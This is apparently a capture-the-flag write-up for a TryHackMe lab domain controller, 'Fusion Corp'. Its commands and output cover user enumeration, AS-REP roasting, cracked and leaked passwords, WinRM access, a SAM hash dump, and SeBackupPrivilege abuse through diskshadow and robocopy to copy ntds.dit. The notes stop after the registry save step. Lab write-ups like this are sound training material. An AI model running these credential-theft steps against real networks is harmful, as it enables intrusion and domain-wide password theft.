# Nmap

```bash
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: eBusiness Bootstrap Template
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-28 21:40:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-27T21:39:52
| Not valid after:  2026-01-26T21:39:52
| MD5:   dcec:a9ff:e8f4:a1e9:0ee7:b8e5:b696:96bb
|_SHA-1: d15c:5ab3:0c26:b2dc:3db3:c6dd:6c76:0d42:ed30:afa2
|_ssl-date: 2025-07-28T21:41:14+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-28T21:40:37+00:00
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## HTTP (80)

- Found interesting directory `backup`
    - Contains employee names

```bash
┌──(mdot㉿kali)-[~/Tryhackme/fusion_corp]
└─$ kerbrute userenum -d fusion.corp --dc 10.10.197.136 users.lst     

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/28/25 - Ronnie Flathers @ropnop

2025/07/28 17:50:00 >  Using KDC(s):
2025/07/28 17:50:00 >  	10.10.197.136:88

2025/07/28 17:50:00 >  [+] VALID USERNAME:	 lparker@fusion.corp

```

- Valid user `lparker`

### ASREP Roasting

```bash
─(mdot㉿kali)-[~/Tryhackme/fusion_corp]
└─$ GetNPUsers.py fusion.corp/ -usersfile users.lst -format hashcat

$krb5asrep$23$lparker@FUSION.CORP:b7cd2b13a67d39d7a9721e15ef01f065$33c18765ffd9935fb2feb00c840b00e0a54494121a58c40f112afbf1af46d6020474952cdca8e16aba947aad39e055a04f992b52af3d01308393ab7a7996b95cd7c5575eba0d556823f380de216e4b7a3d975c0a226db4809234699c5703da3a1fbb06a39948ad67189998a939e979cc1b14ba6238800e52a4289d0c684071e36cff9cc92198520e641e3dc8199a6d1dfca97d4e4052faa6257ae18edf1a348aa03cad5aa7bab32a411831b302ab9dce26a5a0c0f6bab2cdfc2e6210e967cc027a4a11b115be03b4f7a7f5ce7af56e75df166f012fda12555afd3185d7287cead54b3f3b62ab35ca4f27
```

- Valid Credentials: `lparker:!!abbylvzsvs2k6!`

```bash
──(mdot㉿kali)-[~/Tryhackme/fusion_corp]
└─$ crackmapexec winrm 10.10.197.136 -u 'lparker' -p '!!abbylvzsvs2k6!' 
SMB         10.10.197.136   5985   FUSION-DC        [*] Windows 10.0 Build 17763 (name:FUSION-DC) (domain:fusion.corp)
HTTP        10.10.197.136   5985   FUSION-DC        [*] http://10.10.197.136:5985/wsman

HTTP        10.10.197.136   5985   FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! (Pwn3d!)

```

- WINRM access

```bash
──(mdot㉿kali)-[~/Tryhackme/fusion_corp]
└─$ crackmapexec smb 10.10.197.136 -u 'lparker' -p '!!abbylvzsvs2k6!' --users 
SMB         10.10.197.136   445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
SMB         10.10.197.136   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
SMB         10.10.197.136   445    FUSION-DC        [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.197.136   445    FUSION-DC        [+] Enumerated domain user(s)
SMB         10.10.197.136   445    FUSION-DC        fusion.corp\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.197.136   445    FUSION-DC        fusion.corp\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.197.136   445    FUSION-DC        fusion.corp\krbtgt                         Key Distribution Center Service Account
SMB         10.10.197.136   445    FUSION-DC        fusion.corp\lparker                        
SMB         10.10.197.136   445    FUSION-DC        fusion.corp\jmurphy                        Password set to u8WC3!kLsgw=#bRY

```

- Credentials - `jmurphy:u8WC3!kLsgw=#bRY`
    - Winrm access
    - Interesting Privileges: `Sebackupprivielge`

```bash
└─$ secretsdump.py -sam sam -system ~/Tools/username-anarchy/system local
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- make viper.dsh file

```bash
set context persistent nowriters
add volume c: alias viper 
create 
expose %viper% E: 
```

- `unix2dos viper.dsh`
- Upload `viper.dsh` to target filesytem
    - Make sure it’s in a writeable directory `c:\Windows\tasks`
- `diskshadow /s viper.dsh`
    - Creates a shadowcopy of the c:\ drive and mounts it as x:
- `robocopy /b x:\windows\ntds . ntds.dit`

`reg save HKLM\SYSTEM system.hive`
